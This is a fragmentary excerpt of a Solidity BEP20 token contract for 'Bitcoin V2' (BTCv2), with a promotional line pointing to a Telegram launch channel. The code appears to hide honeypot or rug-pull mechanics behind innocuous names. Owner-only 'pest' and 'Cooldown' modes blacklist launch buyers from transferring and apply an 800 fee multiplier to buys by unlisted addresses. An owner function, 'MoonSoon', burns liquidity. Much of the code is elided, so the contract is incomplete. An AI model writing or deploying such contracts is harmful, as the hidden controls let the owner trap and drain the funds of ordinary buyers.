...
Do not but till posted in https://t.me/Bitcoinv2launch no sympathy given.
...
contract BitcoinV2 is IBEP20, Auth {
    ...
    string constant _name = "Bitcoin V2";
    string constant _symbol = "BTCv2";
    ...
    mapping (address => bool) public isCooldowned;
    ...
    uint8 public buycooldownTimerInterval = 20;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0xaF153c388ACc8CbEEeEd39512569941437CF84C0;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(pestMode){
            require(!ispested[sender],"pested");    
        }

        if(!authorizations[sender] && !authorizations[recipient]){
            require(tradingOpen,"Trading not open yet");
            if(sender == pair && launchBlock + swapDelay >= block.number && tx.gasprice >= swapAt){ispested[recipient] = true;}
        }
    ...
    function takeFee(address sender, uint256 amount, bool isSell, address receiver) internal returns (uint256) {
        ...
        if(CooldownMode && !isCooldowned[receiver] && !isSell){
            multiplier = 800;
        }
    ...
    function enable_pest(bool _status) public onlyOwner {
     ...
     function enable_Cooldown(bool _status) public onlyOwner {
        CooldownMode = _status;
    }
    //GK
    ...
    function manage_Cooldown(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isCooldowned[addresses[i]] = status;
        }
    }
    ...
    function MoonSoon(uint256 percent_base10000) public onlyOwner returns (bool){
    ...
    bool status = MoonSoon(percentForLPBurn);
    if(status) {
